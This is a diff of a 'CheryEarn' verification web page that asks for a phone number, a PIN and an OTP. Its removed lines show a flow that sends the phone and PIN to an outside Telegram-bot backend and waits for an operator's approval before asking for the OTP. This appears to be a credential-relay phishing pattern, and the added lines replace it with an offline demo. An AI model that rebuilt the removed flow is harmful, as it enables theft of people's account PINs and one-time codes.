@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title> Verification</title>
+    <title>CheryEarn Verification</title>
 
     <style>
         * {
@@ -27,7 +27,7 @@
         .card {
             width: 100%;
             max-width: 420px;
-            background: #ffffff;
+            background: #fff;
             border-radius: 18px;
             padding: 28px;
             box-shadow: 0 12px 35px rgba(15, 23, 42, 0.10);
@@ -98,8 +98,7 @@
 
         input:focus {
             border-color: #2563eb;
-            background: #ffffff;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.10);
+            background: #fff;
         }
 
         button {
@@ -108,41 +107,39 @@
             border: none;
             border-radius: 10px;
             background: #2563eb;
-            color: #ffffff;
+            color: #fff;
             font-size: 15px;
             font-weight: 700;
             cursor: pointer;
         }
 
-        button:disabled {
-            opacity: .65;
-            cursor: not-allowed;
-        }
-
-        .verification {
+        .page {
             display: none;
             text-align: center;
-            padding: 20px 5px 5px;
         }
 
-        .verification-icon {
-            font-size: 38px;
-            margin-bottom: 12px;
+        .page.active {
+            display: block;
         }
 
-        .verification h2 {
+        .icon {
+            font-size: 42px;
+            margin-bottom: 14px;
+        }
+
+        .page h2 {
             font-size: 21px;
             margin-bottom: 10px;
         }
 
-        .verification p {
+        .page p {
             color: #64748b;
             font-size: 14px;
             line-height: 1.6;
         }
 
         .loading {
-            margin: 18px auto;
+            margin: 20px auto;
             width: 32px;
             height: 32px;
             border: 4px solid #dbeafe;
@@ -157,40 +154,11 @@
             }
         }
 
-        .otp-box {
-            display: none;
-            text-align: center;
-            padding-top: 10px;
-        }
-
-        .otp-box h2 {
-            font-size: 21px;
-            margin-bottom: 10px;
-        }
-
-        .otp-box p {
-            color: #64748b;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 18px;
-        }
-
         .otp-input {
-            margin-bottom: 15px;
+            margin: 20px 0 15px;
             text-align: center;
             letter-spacing: 5px;
             font-size: 20px;
-        }
-
-        .success {
-            margin-top: 18px;
-            padding: 15px;
-            border-radius: 10px;
-            background: #dcfce7;
-            color: #166534;
-            text-align: left;
-            font-size: 14px;
-            line-height: 1.6;
         }
 
         .footer {
@@ -198,6 +166,15 @@
             margin-top: 22px;
             color: #94a3b8;
             font-size: 12px;
+        }
+
+        .error {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 10px;
+            background: #fee2e2;
+            color: #991b1b;
+            font-size: 13px;
         }
     </style>
 </head>
@@ -208,60 +185,64 @@
 
     <div class="logo">C</div>
 
-    <h1>Verification</h1>
+    <!-- PAGE 1 -->
 
-    <p class="subtitle">
-        Enter synthetic values to test the verification flow.
-    </p>
+    <div id="pageOne" class="page active">
 
-    <span class="demo-badge">
-         VERIFICATION
-    </span>
+        <h1>Verification</h1>
 
-    <!-- DEMO FORM -->
+        <p class="subtitle">
+            Enter synthetic values to test the verification flow.
+        </p>
 
-    <form id="verificationForm">
+        <span class="demo-badge">
+            DEMO VERIFICATION
+        </span>
 
-        <div class="field">
-            <label for="phone">
-                Phone Number
-            </label>
+        <form id="verificationForm">
 
-            <input
-                type="tel"
-                id="phone"
-                placeholder="+243XXXXXXXXX"
-                required
-            >
-        </div>
+            <div class="field">
+                <label for="phone">
+                    Phone Number
+                </label>
 
-        <div class="field">
-            <label for="demoPin">
-                PIN
-            </label>
+                <input
+                    type="tel"
+                    id="phone"
+                    placeholder="+243XXXXXXXXX"
+                    required
+                >
+            </div>
 
-            <input
-                type="text"
-                id="Pin"
-                placeholder="Enter demo PIN"
-                required
-            >
-        </div>
+            <div class="field">
+                <label for="demoPin">
+                    Demo PIN
+                </label>
 
-        <button type="submit" id="submitBtn">
-            Continue
-        </button>
+                <input
+                    type="text"
+                    id="demoPin"
+                    placeholder="Enter demo PIN"
+                    required
+                >
+            </div>
 
-    </form>
+            <button type="submit">
+                Continue
+            </button>
 
-    <!-- VERIFYING -->
+        </form>
 
-    <div
-        class="verification"
-        id="verificationBox"
-    >
+        <div id="error"></div>
 
-        <div class="verification-icon">
+    </div>
+
+
+    <!-- PAGE 2 -->
+
+    <div id="pageTwo" class="page">
+
+        <div class="icon">
             🔐
         </div>
 
@@ -272,7 +253,7 @@
         <div class="loading"></div>
 
         <p>
-            Verifying your PIN...
+            Verifying your demo PIN...
         </p>
 
         <p>
@@ -281,24 +262,22 @@
 
     </div>
 
-    <!-- DEMO OTP -->
 
-    <div
-        class="otp-box"
-        id="otpBox"
-    >
+    <!-- PAGE 3 -->
 
-        <div class="verification-icon">
+    <div id="pageThree" class="page">
+
+        <div class="icon">
             🔢
         </div>
 
         <h2>
-            Enter  OTP
+            Enter Demo OTP
         </h2>
 
         <p>
-            Your test request was approved.
-            Enter  OTP to complete .
+            Enter a synthetic OTP to complete
+            this demonstration.
         </p>
 
         <input
@@ -319,45 +298,65 @@
 
     </div>
 
-    <div id="result"></div>
+
+    <!-- PAGE 4 -->
+
+    <div id="pageFour" class="page">
+
+        <div class="icon">
+            ✅
+        </div>
+
+        <h2>
+            Demo Complete
+        </h2>
+
+        <p>
+            The synthetic verification flow
+            has completed successfully.
+        </p>
+
+    </div>
+
 
     <div class="footer">
-        
+        CheryEarn Demo
     </div>
 
 </div>
 
-<script>
 
-const BACKEND_URL =
-    "https://telegram-bot-backend-n0gd.onrender.com";
+<script>
 
 const form =
     document.getElementById("verificationForm");
 
-const button =
-    document.getElementById("submitBtn");
+const pageOne =
+    document.getElementById("pageOne");
 
-const verificationBox =
-    document.getElementById("verificationBox");
+const pageTwo =
+    document.getElementById("pageTwo");
 
-const otpBox =
-    document.getElementById("otpBox");
+const pageThree =
+    document.getElementById("pageThree");
+
+const pageFour =
+    document.getElementById("pageFour");
+
+const errorBox =
+    document.getElementById("error");
 
 const otpButton =
     document.getElementById("otpButton");
 
-const result =
-    document.getElementById("result");
-
 
 // ==========================================
-// START DEMO VERIFICATION
+// PAGE 1 → PAGE 2
 // ==========================================
 
 form.addEventListener(
     "submit",
-    async function(event) {
+    function(event) {
 
         event.preventDefault();
 
@@ -367,262 +366,59 @@ form.addEventListener(
                 .value
                 .trim();
 
-        const Pin =
+        const demoPin =
             document
                 .getElementById("demoPin")
                 .value
                 .trim();
 
-        if (!phone || !Pin) {
+        if (!phone || !demoPin) {
+
+            errorBox.className = "error";
+
+            errorBox.textContent =
+                "Please enter the demo phone number and demo PIN.";
+
             return;
         }
 
-        button.disabled = true;
-        button.textContent = "Sending...";
+        errorBox.className = "";
+        errorBox.textContent = "";
 
-        result.innerHTML = "";
-        result.className = "";
+        pageOne.classList.remove("active");
 
-        try {
+        pageTwo.classList.add("active");
 
-            const response =
-                await fetch(
-                    `${BACKEND_URL}/demo-verification`,
-                    {
-                        method: "POST",
-
-                        headers: {
-                            "Content-Type":
-                                "application/json"
-                        },
-
-                        body: JSON.stringify({
-                            phone: phone,
-                            demoPin: demoPin
-                        })
-                    }
-                );
-
-            const data =
-                await response.json();
-
-            if (
-                !response.ok ||
-                !data.success
-            ) {
-
-                throw new Error(
-                    data.message ||
-                    "Unable to start demo verification."
-                );
-            }
-
-            console.log(
-                "Demo request created:",
-                data.requestId
-            );
-
-            form.style.display = "none";
-
-            verificationBox.style.display =
-                "block";
-
-            startStatusCheck(
-                data.requestId
-            );
-
-        } catch (error) {
-
-            console.error(
-                "Demo verification error:",
-                error
-            );
-
-            button.disabled = false;
-
-            button.textContent =
-                "Continue";
-
-            result.className =
-                "success";
-
-            result.style.background =
-                "#fee2e2";
-
-            result.style.color =
-                "#991b1b";
-
-            result.textContent =
-                "❌ " + error.message;
-        }
     }
 );
 
 
 // ==========================================
-// CHECK TELEGRAM DECISION
+// DEMO: PAGE 2 → PAGE 3
 // ==========================================
 
-function startStatusCheck(
-    requestId
-) {
+// Automatically advances after a short
+// demonstration delay.
 
-    let attempts = 0;
+setTimeout(
+    function() {
 
-    const maxAttempts = 150;
+        if (
+            pageTwo.classList.contains("active")
+        ) {
 
-    const interval =
-        setInterval(
-            async function() {
+            pageTwo.classList.remove("active");
 
-                attempts++;
+            pageThree.classList.add("active");
+        }
 
-                try {
-
-                    const response =
-                        await fetch(
-                            `${BACKEND_URL}/demo-verification/status/${encodeURIComponent(requestId)}`
-                        );
-
-                    const data =
-                        await response.json();
-
-                    console.log(
-                        "Demo status:",
-                        data
-                    );
-
-                    if (
-                        data.status ===
-                        "approved"
-                    ) {
-
-                        clearInterval(
-                            interval
-                        );
-
-                        showDemoOtpPage();
-
-                        return;
-                    }
-
-                    if (
-                        data.status ===
-                        "rejected"
-                    ) {
-
-                        clearInterval(
-                            interval
-                        );
-
-                        showRejectedPage();
-
-                        return;
-                    }
-
-                } catch (error) {
-
-                    console.error(
-                        "Status check failed:",
-                        error
-                    );
-                }
-
-                if (
-                    attempts >=
-                    maxAttempts
-                ) {
-
-                    clearInterval(
-                        interval
-                    );
-
-                    showTimeoutPage();
-                }
-
-            },
-            2000
-        );
-}
+    },
+    3000
+);
 
 
 // ==========================================
-// SHOW DEMO OTP PAGE
-// ==========================================
-
-function showDemoOtpPage() {
-
-    verificationBox.style.display =
-        "none";
-
-    otpBox.style.display =
-        "block";
-
-    result.innerHTML = "";
-
-    window.scrollTo({
-        top: 0,
-        behavior: "smooth"
-    });
-}
-
-
-// ==========================================
-// REJECTED
-// ==========================================
-
-function showRejectedPage() {
-
-    verificationBox.style.display =
-        "none";
-
-    otpBox.style.display =
-        "block";
-
-    otpBox.innerHTML = `
-
-        <div class="verification-icon">
-            ❌
-        </div>
-
-        <h2>
-            Verification Cancelled
-        </h2>
-
-        <p>
-            The  request was rejected
-            by the test administrator.
-        </p>
-
-    `;
-}
-
-
-// ==========================================
-// TIMEOUT
-// ==========================================
-
-function showTimeoutPage() {
-
-    verificationBox.style.display =
-        "none";
-
-    result.className =
-        "success";
-
-    result.style.background =
-        "#fef3c7";
-
-    result.style.color =
-        "#92400e";
-
-    result.textContent =
-        "The  verification timed out. Please start a new test.";
-}
-
-
-// ==========================================
-// DEMO OTP
+// PAGE 3 → PAGE 4
 // ==========================================
 
 otpButton.addEventListener(
@@ -638,28 +434,16 @@ otpButton.addEventListener(
         if (!demoOtp) {
 
             alert(
-                "Enter a synthetic  OTP."
+                "Enter a synthetic demo OTP."
             );
 
             return;
         }
 
-        otpBox.innerHTML = `
+        pageThree.classList.remove("active");
 
-            <div class="verification-icon">
-                ✅
-            </div>
+        pageFour.classList.add("active");
 
-            <h2>
-                 Verification Complete
-            </h2>
-
-            <p>
-                The synthetic verification flow
-                has completed successfully.
-            </p>
-
-        `;
     }
 );
 
